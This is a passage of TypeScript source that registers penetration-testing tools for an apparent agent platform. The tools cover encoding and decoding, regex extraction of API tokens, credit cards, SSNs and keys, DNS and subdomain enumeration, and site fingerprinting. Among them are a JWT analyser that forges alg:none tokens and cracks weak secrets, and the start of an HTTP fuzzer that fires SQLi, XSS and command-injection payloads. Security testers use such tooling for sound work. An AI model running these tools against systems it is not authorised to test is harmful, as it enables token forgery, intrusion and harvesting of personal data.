        lines.push('**Recommendation**: This password was found in a common wordlist. It should be changed immediately.')
      } else {
        lines.push(`### Not Cracked`)
        lines.push('')
        lines.push(`| Field | Value |`)
        lines.push(`|-------|-------|`)
        lines.push(`| Attempts | ${attempts.toLocaleString()} |`)
        lines.push(`| Speed | ${rate.toLocaleString()} hashes/sec |`)
        lines.push(`| Time | ${elapsed}ms |`)
        lines.push('')
        lines.push('Password not found in the wordlist. Consider using a larger wordlist or specialized tools (hashcat, john).')
      }

      return lines.join('\n')
    },
  })

  // ─────────────────────────────────────────────────────────────────────────────
  // 2. encode_decode — Multi-format encoder/decoder
  // ─────────────────────────────────────────────────────────────────────────────

  registerTool({
    name: 'encode_decode',
    description: 'Encode or decode data in multiple formats. Supports base64, hex, URL encoding, HTML entities, binary, ROT13, ASCII85, JWT decode, and Unicode escapes. Supports chained operations (e.g., base64 then hex).',
    parameters: {
      input: { type: 'string', description: 'Data to encode or decode', required: true },
      operation: { type: 'string', description: '"encode" or "decode"', required: true },
      format: { type: 'string', description: 'Format: base64, hex, url, html, binary, rot13, ascii85, jwt_decode, unicode', required: true },
      chain: { type: 'string', description: 'Comma-separated formats for chained operations (e.g., "base64,hex,url")' },
    },
    tier: 'free',
    async execute(args) {
      const input = String(args.input)
      const operation = String(args.operation).toLowerCase()
      const format = String(args.format).toLowerCase()
      const chain = args.chain ? String(args.chain).split(',').map(f => f.trim().toLowerCase()) : null

      function encodeSingle(data: string, fmt: string): string {
        switch (fmt) {
          case 'base64':
            return Buffer.from(data).toString('base64')
          case 'hex':
            return Buffer.from(data).toString('hex')
          case 'url':
            return encodeURIComponent(data)
          case 'html': {
            const map: Record<string, string> = {
              '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;',
              "'": '&#39;', '/': '&#47;',
            }
            return data.replace(/[&<>"'/]/g, c => map[c] || c)
          }
          case 'binary':
            return Array.from(Buffer.from(data))
              .map(b => b.toString(2).padStart(8, '0'))
              .join(' ')
          case 'rot13':
            return rot13(data)
          case 'ascii85':
            return ascii85Encode(Buffer.from(data))
          case 'unicode':
            return Array.from(data)
              .map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0'))
              .join('')
          default:
            return `Unsupported format: ${fmt}`
        }
      }

      function decodeSingle(data: string, fmt: string): string {
        switch (fmt) {
          case 'base64':
            return Buffer.from(data, 'base64').toString('utf-8')
          case 'hex':
            return Buffer.from(data.replace(/\s/g, ''), 'hex').toString('utf-8')
          case 'url':
            return decodeURIComponent(data)
          case 'html': {
            const map: Record<string, string> = {
              '&amp;': '&', '&lt;': '<', '&gt;': '>', '&quot;': '"',
              '&#39;': "'", '&#47;': '/', '&apos;': "'",
            }
            // Also handle numeric entities
            let result = data
            for (const [entity, char] of Object.entries(map)) {
              result = result.split(entity).join(char)
            }
            result = result.replace(/&#(\d+);/g, (_, num) => String.fromCharCode(parseInt(num, 10)))
            result = result.replace(/&#x([a-f0-9]+);/gi, (_, hex) => String.fromCharCode(parseInt(hex, 16)))
            return result
          }
          case 'binary':
            return data.split(/\s+/)
              .filter(Boolean)
              .map(b => String.fromCharCode(parseInt(b, 2)))
              .join('')
          case 'rot13':
            return rot13(data)
          case 'ascii85':
            return ascii85Decode(data)
          case 'jwt_decode': {
            const parts = data.split('.')
            if (parts.length < 2) return 'Error: Invalid JWT format (expected header.payload.signature)'
            const header = JSON.parse(base64UrlDecode(parts[0]))
            const payload = JSON.parse(base64UrlDecode(parts[1]))
            const signature = parts[2] || '(none)'
            return JSON.stringify({ header, payload, signature }, null, 2)
          }
          case 'unicode':
            return data.replace(/\\u([a-f0-9]{4})/gi, (_, hex) =>
              String.fromCharCode(parseInt(hex, 16))
            )
          default:
            return `Unsupported format: ${fmt}`
        }
      }

      const lines: string[] = ['## Encode/Decode Result', '']

      if (chain && chain.length > 0) {
        // Chained operations
        lines.push(`**Chain**: ${chain.join(' -> ')}`)
        lines.push(`**Operation**: ${operation}`)
        lines.push('')

        let current = input
        const steps: string[] = []

        const formats = operation === 'decode' ? [...chain].reverse() : chain

        for (const fmt of formats) {
          try {
            current = operation === 'encode' ? encodeSingle(current, fmt) : decodeSingle(current, fmt)
            steps.push(`**${fmt}**: \`${current.length > 200 ? current.slice(0, 200) + '...' : current}\``)
          } catch (e: any) {
            steps.push(`**${fmt}**: ERROR — ${e.message}`)
            break
          }
        }

        lines.push('### Steps')
        for (const s of steps) lines.push(s)
        lines.push('')
        lines.push('### Final Result')
        lines.push('```')
        lines.push(current)
        lines.push('```')
      } else {
        // Single operation
        lines.push(`**Format**: ${format}`)
        lines.push(`**Operation**: ${operation}`)
        lines.push('')

        try {
          const result = operation === 'encode'
            ? encodeSingle(input, format)
            : decodeSingle(input, format)

          lines.push('### Result')
          lines.push('```')
          lines.push(result)
          lines.push('```')
          lines.push('')
          lines.push(`**Input length**: ${input.length}`)
          lines.push(`**Output length**: ${result.length}`)
        } catch (e: any) {
          lines.push(`**Error**: ${e.message}`)
        }
      }

      return lines.join('\n')
    },
  })

  // ─────────────────────────────────────────────────────────────────────────────
  // 3. regex_extract — Pattern extraction from data
  // ─────────────────────────────────────────────────────────────────────────────

  registerTool({
    name: 'regex_extract',
    description: 'Extract patterns from text data. Built-in patterns for emails, IPs, URLs, API tokens, phone numbers, credit cards, SSNs, hashes, and crypto keys. Supports custom regex patterns.',
    parameters: {
      data: { type: 'string', description: 'Text to search for patterns', required: true },
      pattern: { type: 'string', description: 'Pattern: emails, ips, urls, tokens, phones, credit_cards, ssn, hashes, keys, custom', required: true },
      custom_regex: { type: 'string', description: 'Custom regex pattern (when pattern="custom")' },
    },
    tier: 'free',
    async execute(args) {
      const data = String(args.data)
      const patternName = String(args.pattern).toLowerCase()

      const patterns: Record<string, { regex: RegExp; label: string }> = {
        emails: {
          regex: /[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}/g,
          label: 'Email addresses',
        },
        ips: {
          regex: /\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b|(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}/g,
          label: 'IP addresses (IPv4 and IPv6)',
        },
        urls: {
          regex: /https?:\/\/[^\s<>"')\]]+/g,
          label: 'URLs',
        },
        tokens: {
          // Matches common API key / token formats
          regex: /(?:(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9_]{36,})|(?:sk-[A-Za-z0-9]{32,})|(?:sk_live_[A-Za-z0-9]{24,})|(?:pk_live_[A-Za-z0-9]{24,})|(?:xox[bpas]-[A-Za-z0-9\-]+)|(?:AIza[A-Za-z0-9\-_]{35})|(?:AKIA[A-Z0-9]{16})|(?:ya29\.[A-Za-z0-9\-_]+)|(?:eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+)|(?:bearer\s+[A-Za-z0-9\-_.~+\/]+=*)/gi,
          label: 'API tokens and keys',
        },
        phones: {
          regex: /(?:\+?1[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}|\+\d{1,3}[-.\s]?\d{4,14}/g,
          label: 'Phone numbers',
        },
        credit_cards: {
          // Visa, MC, Amex, Discover, Diners, JCB
          regex: /\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|6(?:011|5[0-9]{2})[0-9]{12}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})\b/g,
          label: 'Credit card numbers',
        },
        ssn: {
          regex: /\b\d{3}[-.\s]?\d{2}[-.\s]?\d{4}\b/g,
          label: 'Social Security Numbers (potential)',
        },
        hashes: {
          regex: /\b[a-f0-9]{32}\b|\b[a-f0-9]{40}\b|\b[a-f0-9]{64}\b|\b[a-f0-9]{128}\b/gi,
          label: 'Hash values (MD5, SHA-1, SHA-256, SHA-512)',
        },
        keys: {
          // Private keys, certificates, AWS keys
          regex: /-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP )?(?:PRIVATE|PUBLIC) KEY-----[\s\S]*?-----END (?:RSA |EC |DSA |OPENSSH |PGP )?(?:PRIVATE|PUBLIC) KEY-----|AKIA[A-Z0-9]{16}|(?:A3T[A-Z0-9]|ABIA|ACCA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}/g,
          label: 'Cryptographic keys and AWS credentials',
        },
      }

      let regex: RegExp
      let label: string

      if (patternName === 'custom') {
        const customRegex = String(args.custom_regex || '')
        if (!customRegex) {
          return 'Error: custom_regex parameter required when pattern="custom"'
        }
        try {
          regex = new RegExp(customRegex, 'g')
          label = `Custom pattern: /${customRegex}/g`
        } catch (e: any) {
          return `Error: Invalid regex — ${e.message}`
        }
      } else {
        const p = patterns[patternName]
        if (!p) {
          return `Error: Unknown pattern "${patternName}". Available: ${Object.keys(patterns).join(', ')}, custom`
        }
        regex = p.regex
        label = p.label
      }

      const matches = [...data.matchAll(regex)].map(m => m[0])
      const unique = [...new Set(matches)]

      const lines: string[] = [
        '## Pattern Extraction',
        '',
        `**Pattern**: ${label}`,
        `**Total matches**: ${matches.length}`,
        `**Unique matches**: ${unique.length}`,
        '',
      ]

      if (unique.length > 0) {
        lines.push('### Matches')
        lines.push('')
        for (let i = 0; i < Math.min(unique.length, 100); i++) {
          const count = matches.filter(m => m === unique[i]).length
          lines.push(`${i + 1}. \`${unique[i]}\`${count > 1 ? ` (x${count})` : ''}`)
        }
        if (unique.length > 100) {
          lines.push(`... and ${unique.length - 100} more`)
        }
      } else {
        lines.push('No matches found.')
      }

      return lines.join('\n')
    },
  })

  // ─────────────────────────────────────────────────────────────────────────────
  // 4. dns_enum — DNS enumeration
  // ─────────────────────────────────────────────────────────────────────────────

  registerTool({
    name: 'dns_enum',
    description: 'Enumerate DNS records for a domain. Supports A, AAAA, MX, NS, TXT, CNAME, SOA, SRV record types. Optionally scans 100 common subdomains for existence.',
    parameters: {
      domain: { type: 'string', description: 'Domain to enumerate', required: true },
      type: { type: 'string', description: 'Record type: all, A, AAAA, MX, NS, TXT, CNAME, SOA, SRV', default: 'all' },
      subdomain_scan: { type: 'string', description: 'Also check common subdomains (true/false)', default: 'false' },
    },
    tier: 'free',
    timeout: 120_000,
    async execute(args) {
      const domain = String(args.domain).replace(/^https?:\/\//, '').replace(/\/.*$/, '').trim()
      const type = String(args.type || 'all').toUpperCase()
      const subdomainScan = String(args.subdomain_scan) === 'true'

      const resolver = new Resolver()
      resolver.setServers(['8.8.8.8', '8.8.4.4', '1.1.1.1'])

      const lines: string[] = [
        '## DNS Enumeration',
        '',
        `**Domain**: ${domain}`,
        '',
      ]

      const recordTypes = type === 'ALL'
        ? ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA', 'SRV']
        : [type]

      for (const rt of recordTypes) {
        try {
          let records: any
          switch (rt) {
            case 'A':
              records = await resolver.resolve4(domain)
              if (records.length > 0) {
                lines.push(`### A Records`)
                for (const r of records) lines.push(`- ${r}`)
                lines.push('')
              }
              break
            case 'AAAA':
              records = await resolver.resolve6(domain)
              if (records.length > 0) {
                lines.push(`### AAAA Records`)
                for (const r of records) lines.push(`- ${r}`)
                lines.push('')
              }
              break
            case 'MX':
              records = await resolver.resolveMx(domain)
              if (records.length > 0) {
                lines.push(`### MX Records`)
                lines.push('| Priority | Exchange |')
                lines.push('|----------|----------|')
                for (const r of records.sort((a: any, b: any) => a.priority - b.priority)) {
                  lines.push(`| ${r.priority} | ${r.exchange} |`)
                }
                lines.push('')
              }
              break
            case 'NS':
              records = await resolver.resolveNs(domain)
              if (records.length > 0) {
                lines.push(`### NS Records`)
                for (const r of records) lines.push(`- ${r}`)
                lines.push('')
              }
              break
            case 'TXT':
              records = await resolver.resolveTxt(domain)
              if (records.length > 0) {
                lines.push(`### TXT Records`)
                for (const r of records) lines.push(`- \`${r.join('')}\``)
                lines.push('')
              }
              break
            case 'CNAME':
              records = await resolver.resolveCname(domain)
              if (records.length > 0) {
                lines.push(`### CNAME Records`)
                for (const r of records) lines.push(`- ${r}`)
                lines.push('')
              }
              break
            case 'SOA':
              records = await resolver.resolveSoa(domain)
              if (records) {
                lines.push(`### SOA Record`)
                lines.push(`| Field | Value |`)
                lines.push(`|-------|-------|`)
                lines.push(`| Primary NS | ${records.nsname} |`)
                lines.push(`| Admin email | ${records.hostmaster} |`)
                lines.push(`| Serial | ${records.serial} |`)
                lines.push(`| Refresh | ${records.refresh}s |`)
                lines.push(`| Retry | ${records.retry}s |`)
                lines.push(`| Expire | ${records.expire}s |`)
                lines.push(`| Min TTL | ${records.minttl}s |`)
                lines.push('')
              }
              break
            case 'SRV':
              records = await resolver.resolveSrv(domain)
              if (records.length > 0) {
                lines.push(`### SRV Records`)
                lines.push('| Priority | Weight | Port | Target |')
                lines.push('|----------|--------|------|--------|')
                for (const r of records) {
                  lines.push(`| ${r.priority} | ${r.weight} | ${r.port} | ${r.name} |`)
                }
                lines.push('')
              }
              break
          }
        } catch (e: any) {
          if (e.code !== 'ENODATA' && e.code !== 'ENOTFOUND' && e.code !== 'ESERVFAIL') {
            lines.push(`### ${rt} Records — Error: ${e.message}`)
            lines.push('')
          }
        }
      }

      // Subdomain scan
      if (subdomainScan) {
        lines.push('---')
        lines.push('### Subdomain Scan')
        lines.push('')

        const found: { subdomain: string; ips: string[] }[] = []
        const batchSize = 20

        for (let i = 0; i < COMMON_SUBDOMAINS_SMALL.length; i += batchSize) {
          const batch = COMMON_SUBDOMAINS_SMALL.slice(i, i + batchSize)
          const results = await Promise.allSettled(
            batch.map(async (sub) => {
              const fqdn = `${sub}.${domain}`
              const ips = await resolver.resolve4(fqdn)
              return { subdomain: fqdn, ips }
            })
          )
          for (const r of results) {
            if (r.status === 'fulfilled') {
              found.push(r.value)
            }
          }
        }

        if (found.length > 0) {
          lines.push(`**Found**: ${found.length} subdomains`)
          lines.push('')
          lines.push('| Subdomain | IP Addresses |')
          lines.push('|-----------|-------------|')
          for (const f of found) {
            lines.push(`| ${f.subdomain} | ${f.ips.join(', ')} |`)
          }
        } else {
          lines.push('No subdomains found in the common wordlist.')
        }
      }

      return lines.join('\n')
    },
  })

  // ─────────────────────────────────────────────────────────────────────────────
  // 5. tech_fingerprint — Technology stack detection
  // ─────────────────────────────────────────────────────────────────────────────

  registerTool({
    name: 'tech_fingerprint',
    description: 'Detect the technology stack of a website. Analyzes HTTP headers, cookies, HTML meta tags, script sources, and common paths. Identifies server software, frameworks, CMS, CDN, and more.',
    parameters: {
      url: { type: 'string', description: 'URL to fingerprint', required: true },
    },
    tier: 'free',
    timeout: 30_000,
    async execute(args) {
      const url = String(args.url).startsWith('http') ? String(args.url) : `https://${args.url}`
      const lines: string[] = ['## Technology Fingerprint', '', `**Target**: ${url}`, '']

      const technologies: { category: string; name: string; evidence: string }[] = []

      try {
        const resp = await fetchWithTimeout(url, {
          headers: {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
          },
          redirect: 'follow',
        }, 15000)

        const headers = Object.fromEntries(resp.headers.entries())
        const body = await resp.text()

        // ── Header analysis ──
        const serverHeader = headers['server'] || ''
        if (serverHeader) {
          technologies.push({ category: 'Server', name: serverHeader, evidence: 'Server header' })
        }

        const poweredBy = headers['x-powered-by'] || ''
        if (poweredBy) {
          technologies.push({ category: 'Framework', name: poweredBy, evidence: 'X-Powered-By header' })
        }

        if (headers['x-aspnet-version']) {
          technologies.push({ category: 'Framework', name: `ASP.NET ${headers['x-aspnet-version']}`, evidence: 'X-AspNet-Version header' })
        }
        if (headers['x-aspnetmvc-version']) {
          technologies.push({ category: 'Framework', name: `ASP.NET MVC ${headers['x-aspnetmvc-version']}`, evidence: 'X-AspNetMvc-Version header' })
        }
        if (headers['x-drupal-cache']) {
          technologies.push({ category: 'CMS', name: 'Drupal', evidence: 'X-Drupal-Cache header' })
        }
        if (headers['x-generator']) {
          technologies.push({ category: 'CMS/Framework', name: headers['x-generator'], evidence: 'X-Generator header' })
        }
        if (headers['x-shopify-stage']) {
          technologies.push({ category: 'eCommerce', name: 'Shopify', evidence: 'X-Shopify-Stage header' })
        }
        if (headers['x-wix-request-id']) {
          technologies.push({ category: 'CMS', name: 'Wix', evidence: 'X-Wix-Request-Id header' })
        }

        // CDN detection
        if (headers['cf-ray']) {
          technologies.push({ category: 'CDN', name: 'Cloudflare', evidence: 'cf-ray header' })
        }
        if (headers['x-cache'] && /HIT|MISS/i.test(headers['x-cache'])) {
          technologies.push({ category: 'CDN/Cache', name: `Cache: ${headers['x-cache']}`, evidence: 'X-Cache header' })
        }
        if (headers['x-amz-cf-id'] || headers['x-amz-cf-pop']) {
          technologies.push({ category: 'CDN', name: 'Amazon CloudFront', evidence: 'X-Amz-Cf-Id header' })
        }
        if (headers['x-vercel-id']) {
          technologies.push({ category: 'Platform', name: 'Vercel', evidence: 'X-Vercel-Id header' })
        }
        if (headers['x-netlify-request-id']) {
          technologies.push({ category: 'Platform', name: 'Netlify', evidence: 'X-Netlify-Request-Id header' })
        }
        if (headers['fly-request-id']) {
          technologies.push({ category: 'Platform', name: 'Fly.io', evidence: 'fly-request-id header' })
        }

        // ── Cookie analysis ──
        const setCookie = headers['set-cookie'] || ''
        if (/PHPSESSID/i.test(setCookie)) {
          technologies.push({ category: 'Language', name: 'PHP', evidence: 'PHPSESSID cookie' })
        }
        if (/JSESSIONID/i.test(setCookie)) {
          technologies.push({ category: 'Language', name: 'Java', evidence: 'JSESSIONID cookie' })
        }
        if (/connect\.sid/i.test(setCookie)) {
          technologies.push({ category: 'Framework', name: 'Express.js (Node.js)', evidence: 'connect.sid cookie' })
        }
        if (/_rails/i.test(setCookie) || /_session_id/i.test(setCookie)) {
          technologies.push({ category: 'Framework', name: 'Ruby on Rails', evidence: '_rails/_session_id cookie' })
        }
        if (/laravel_session/i.test(setCookie)) {
          technologies.push({ category: 'Framework', name: 'Laravel (PHP)', evidence: 'laravel_session cookie' })
        }
        if (/csrftoken/i.test(setCookie) && /sessionid/i.test(setCookie)) {
          technologies.push({ category: 'Framework', name: 'Django (Python)', evidence: 'csrftoken + sessionid cookies' })
        }
        if (/ASP\.NET_SessionId/i.test(setCookie)) {
          technologies.push({ category: 'Framework', name: 'ASP.NET', evidence: 'ASP.NET_SessionId cookie' })
        }
        if (/__cfduid/i.test(setCookie)) {
          technologies.push({ category: 'CDN', name: 'Cloudflare', evidence: '__cfduid cookie' })
        }
        if (/wp-settings/i.test(setCookie) || /wordpress/i.test(setCookie)) {
          technologies.push({ category: 'CMS', name: 'WordPress', evidence: 'WordPress cookie' })
        }

        // ── HTML analysis ──
        const generatorMatch = body.match(/<meta[^>]+name=["']generator["'][^>]+content=["']([^"']+)["']/i)
        if (generatorMatch) {
          technologies.push({ category: 'CMS/Framework', name: generatorMatch[1], evidence: 'meta generator tag' })
        }

        // WordPress indicators
        if (/wp-content|wp-includes|wp-json/i.test(body)) {
          technologies.push({ category: 'CMS', name: 'WordPress', evidence: 'wp-content/wp-includes paths' })
        }

        // React
        if (/__NEXT_DATA__|_next\/static/i.test(body)) {
          technologies.push({ category: 'Framework', name: 'Next.js (React)', evidence: '__NEXT_DATA__ / _next/static' })
        } else if (/react\.production\.min|reactDOM|data-reactroot|__react/i.test(body)) {
          technologies.push({ category: 'Library', name: 'React', evidence: 'React DOM markers' })
        }

        // Vue.js
        if (/vue\.runtime|v-cloak|data-v-[a-f0-9]|__vue__|nuxt/i.test(body)) {
          technologies.push({ category: 'Framework', name: body.match(/nuxt/i) ? 'Nuxt.js (Vue)' : 'Vue.js', evidence: 'Vue markers' })
        }

        // Angular
        if (/ng-version|ng-app|angular\.min\.js|ng-controller/i.test(body)) {
          const vMatch = body.match(/ng-version=["']([^"']+)["']/)
          technologies.push({ category: 'Framework', name: `Angular${vMatch ? ` v${vMatch[1]}` : ''}`, evidence: 'Angular markers' })
        }

        // Svelte
        if (/svelte|__svelte/i.test(body)) {
          technologies.push({ category: 'Framework', name: body.match(/sveltekit/i) ? 'SvelteKit' : 'Svelte', evidence: 'Svelte markers' })
        }

        // jQuery
        if (/jquery\.min\.js|jquery[\-.][\d]/i.test(body)) {
          const jqVersion = body.match(/jquery[.\-](\d+\.\d+\.\d+)/i)
          technologies.push({ category: 'Library', name: `jQuery${jqVersion ? ` v${jqVersion[1]}` : ''}`, evidence: 'jQuery script' })
        }

        // Tailwind CSS
        if (/tailwindcss|tailwind\.min\.css/i.test(body) || /class=["'][^"']*(?:flex|grid|px-|py-|mt-|mb-|text-|bg-|rounded-)/i.test(body)) {
          technologies.push({ category: 'CSS', name: 'Tailwind CSS (likely)', evidence: 'Tailwind utility classes' })
        }

        // Bootstrap
        if (/bootstrap\.min|bootstrap\.css|bootstrap\.js/i.test(body)) {
          technologies.push({ category: 'CSS', name: 'Bootstrap', evidence: 'Bootstrap assets' })
        }

        // Google Analytics / Tag Manager
        if (/gtag|google-analytics|googletagmanager|GA_TRACKING_ID|G-[A-Z0-9]+/i.test(body)) {
          technologies.push({ category: 'Analytics', name: 'Google Analytics / GTM', evidence: 'GA/GTM script' })
        }

        // Hotjar
        if (/hotjar/i.test(body)) {
          technologies.push({ category: 'Analytics', name: 'Hotjar', evidence: 'Hotjar script' })
        }

        // Stripe
        if (/js\.stripe\.com/i.test(body)) {
          technologies.push({ category: 'Payment', name: 'Stripe', evidence: 'Stripe.js' })
        }

        // reCAPTCHA
        if (/recaptcha|google\.com\/recaptcha/i.test(body)) {
          technologies.push({ category: 'Security', name: 'reCAPTCHA', evidence: 'reCAPTCHA script' })
        }

        // GraphQL
        if (/graphql|\/graphql/i.test(body)) {
          technologies.push({ category: 'API', name: 'GraphQL', evidence: 'GraphQL endpoint reference' })
        }

        // Build results
        lines.push('### Detected Technologies')
        lines.push('')

        if (technologies.length > 0) {
          // Group by category
          const grouped = new Map<string, typeof technologies>()
          for (const t of technologies) {
            const existing = grouped.get(t.category) || []
            existing.push(t)
            grouped.set(t.category, existing)
          }

          for (const [category, techs] of grouped) {
            lines.push(`**${category}**:`)
            for (const t of techs) {
              lines.push(`  - ${t.name} _(${t.evidence})_`)
            }
            lines.push('')
          }
        } else {
          lines.push('No technologies definitively identified.')
        }

        // Security headers check
        lines.push('### Security Headers')
        lines.push('')
        const securityHeaders = [
          'strict-transport-security',
          'content-security-policy',
          'x-frame-options',
          'x-content-type-options',
          'x-xss-protection',
          'referrer-policy',
          'permissions-policy',
        ]

        for (const sh of securityHeaders) {
          const val = headers[sh]
          const status = val ? 'present' : 'MISSING'
          const icon = val ? '+' : '-'
          lines.push(`[${icon}] **${sh}**: ${val ? `\`${val.slice(0, 100)}\`` : 'Not set'}`)
        }
        lines.push('')

        lines.push(`**HTTP Status**: ${resp.status} ${resp.statusText}`)
        lines.push(`**Response size**: ${body.length.toLocaleString()} bytes`)

      } catch (e: any) {
        lines.push(`**Error**: ${e.message}`)
      }

      return lines.join('\n')
    },
  })

  // ─────────────────────────────────────────────────────────────────────────────
  // 6. jwt_analyze — JWT token analysis
  // ─────────────────────────────────────────────────────────────────────────────

  registerTool({
    name: 'jwt_analyze',
    deprecated: true,
    description: 'Analyze JWT tokens. Decode header/payload/signature, verify signatures with a secret, test for algorithm confusion (alg:none), and try common weak secrets.',
    parameters: {
      token: { type: 'string', description: 'JWT token to analyze', required: true },
      action: { type: 'string', description: 'Action: decode, verify, test_none, test_weak', default: 'decode' },
      secret: { type: 'string', description: 'Secret key for verification (when action=verify)' },
    },
    tier: 'free',
    async execute(args) {
      const token = String(args.token).trim()
      const action = String(args.action || 'decode')
      const secret = args.secret ? String(args.secret) : undefined

      const parts = token.split('.')
      if (parts.length < 2) {
        return 'Error: Invalid JWT format. Expected header.payload.signature'
      }

      let header: any
      let payload: any
      try {
        header = JSON.parse(base64UrlDecode(parts[0]))
        payload = JSON.parse(base64UrlDecode(parts[1]))
      } catch (e: any) {
        return `Error: Failed to decode JWT — ${e.message}`
      }

      const lines: string[] = ['## JWT Analysis', '']

      // Always show decoded content
      lines.push('### Header')
      lines.push('```json')
      lines.push(JSON.stringify(header, null, 2))
      lines.push('```')
      lines.push('')

      lines.push('### Payload')
      lines.push('```json')
      lines.push(JSON.stringify(payload, null, 2))
      lines.push('```')
      lines.push('')

      // Check expiration
      if (payload.exp) {
        const expDate = new Date(payload.exp * 1000)
        const now = new Date()
        const isExpired = expDate < now
        lines.push(`**Expiration**: ${expDate.toISOString()} ${isExpired ? '(EXPIRED)' : '(valid)'}`)
      }
      if (payload.iat) {
        lines.push(`**Issued at**: ${new Date(payload.iat * 1000).toISOString()}`)
      }
      if (payload.nbf) {
        lines.push(`**Not before**: ${new Date(payload.nbf * 1000).toISOString()}`)
      }
      if (payload.iss) lines.push(`**Issuer**: ${payload.iss}`)
      if (payload.sub) lines.push(`**Subject**: ${payload.sub}`)
      if (payload.aud) lines.push(`**Audience**: ${Array.isArray(payload.aud) ? payload.aud.join(', ') : payload.aud}`)
      lines.push('')

      lines.push('### Signature')
      lines.push(`**Algorithm**: ${header.alg || '(none)'}`)
      lines.push(`**Signature (raw)**: \`${parts[2] ? parts[2].slice(0, 50) + (parts[2].length > 50 ? '...' : '') : '(empty)'}\``)
      lines.push('')

      if (action === 'verify' && secret) {
        // Verify signature
        const alg = (header.alg || '').toLowerCase()
        let hashAlg: string | null = null
        if (alg === 'hs256') hashAlg = 'sha256'
        else if (alg === 'hs384') hashAlg = 'sha384'
        else if (alg === 'hs512') hashAlg = 'sha512'

        if (!hashAlg) {
          lines.push(`**Verification**: Cannot verify — algorithm "${header.alg}" requires asymmetric key (RS256/ES256), not a shared secret.`)
        } else {
          const signingInput = `${parts[0]}.${parts[1]}`
          const expectedSig = createHmac(hashAlg, secret)
            .update(signingInput)
            .digest('base64url')

          const isValid = expectedSig === parts[2]
          lines.push(`### Verification Result`)
          lines.push('')
          lines.push(`**Status**: ${isValid ? 'VALID — signature matches' : 'INVALID — signature does not match'}`)
          lines.push(`**Expected signature**: \`${expectedSig}\``)
          lines.push(`**Actual signature**: \`${parts[2]}\``)
        }
      }

      if (action === 'test_none') {
        lines.push('### Algorithm Confusion Test (alg: none)')
        lines.push('')
        lines.push('The "none" algorithm attack exploits servers that fail to validate the algorithm field.')
        lines.push('')

        // Generate tokens with alg:none
        const noneHeaders = [
          { alg: 'none' },
          { alg: 'None' },
          { alg: 'NONE' },
          { alg: 'nOnE' },
        ]

        lines.push('**Test tokens** (send these to the target and see if they are accepted):')
        lines.push('')
        for (const nh of noneHeaders) {
          const encodedHeader = base64UrlEncode(JSON.stringify(nh))
          const noneToken = `${encodedHeader}.${parts[1]}.`
          lines.push(`\`alg: ${nh.alg}\`: \`${noneToken}\``)
        }
        lines.push('')
        lines.push('If any of these tokens are accepted, the server is vulnerable to algorithm confusion.')
      }

      if (action === 'test_weak') {
        lines.push('### Weak Secret Test')
        lines.push('')

        const alg = (header.alg || '').toLowerCase()
        let hashAlg: string | null = null
        if (alg === 'hs256') hashAlg = 'sha256'
        else if (alg === 'hs384') hashAlg = 'sha384'
        else if (alg === 'hs512') hashAlg = 'sha512'

        if (!hashAlg) {
          lines.push(`Cannot test weak secrets — algorithm "${header.alg}" is not HMAC-based.`)
        } else {
          const weakSecrets = [
            'secret', 'password', '123456', 'key', 'admin', 'test',
            'default', 'jwt_secret', 'my_secret', 'changeme', 'supersecret',
            'your-256-bit-secret', 'your-384-bit-secret', 'your-512-bit-secret',
            'shhhhh', 'jwt', 'token', 'private', 'public', 'hmac',
            'apikey', 'api_key', 'app_secret', 'master_key', 'signing_key',
            'HS256', 'HS384', 'HS512', 'secretkey', 'secret_key',
            'mysecret', 'my-secret', 'change_me', 'notsecret', 'devkey',
            '', ' ', 'null', 'undefined', 'none', 'true', 'false',
            '0', '1', 'a', 'abc', 'aaa', '111', '000',
          ]

          const signingInput = `${parts[0]}.${parts[1]}`
          let found = false

          for (const ws of weakSecrets) {
            const expectedSig = createHmac(hashAlg, ws)
              .update(signingInput)
              .digest('base64url')

            if (expectedSig === parts[2]) {
              lines.push(`**CRACKED! Secret found**: \`${ws || '(empty string)'}\``)
              lines.push('')
              lines.push('This JWT is signed with a weak/common secret. Any attacker can forge tokens.')
              found = true
              break
            }
          }

          if (!found) {
            lines.push(`Tested ${weakSecrets.length} common secrets — none matched.`)
            lines.push('The secret appears to be non-trivial. Consider longer wordlist or hashcat for brute force.')
          }
        }
      }

      return lines.join('\n')
    },
  })

  // ─────────────────────────────────────────────────────────────────────────────
  // 7. http_fuzz — HTTP parameter fuzzing
  // ─────────────────────────────────────────────────────────────────────────────

  registerTool({
    name: 'http_fuzz',
    description: 'Fuzz HTTP parameters with SQLi, XSS, path traversal, and command injection payloads. Sends requests and analyzes responses for vulnerability indicators (error messages, reflected input, timing anomalies).',
    parameters: {
      url: { type: 'string', description: 'URL to fuzz', required: true },
      method: { type: 'string', description: 'HTTP method: GET or POST', default: 'GET' },
      param: { type: 'string', description: 'Parameter name to fuzz', required: true },
      payloads: { type: 'string', description: 'Payload type: sqli, xss, traversal, command, custom', default: 'sqli' },
      custom_payloads: { type: 'string', description: 'Comma-separated custom payloads' },
    },
    tier: 'free',
    timeout: 300_000,
    async execute(args) {
      const baseUrl = String(args.url)
      const method = String(args.method || 'GET').toUpperCase()
      const param = String(args.param)
      const payloadType = String(args.payloads || 'sqli')

      let payloads: string[]
      switch (payloadType) {
        case 'sqli': payloads = SQLI_PAYLOADS; break
        case 'xss': payloads = XSS_PAYLOADS; break
        case 'traversal': payloads = TRAVERSAL_PAYLOADS; break
        case 'command': payloads = COMMAND_PAYLOADS; break
        case 'custom':
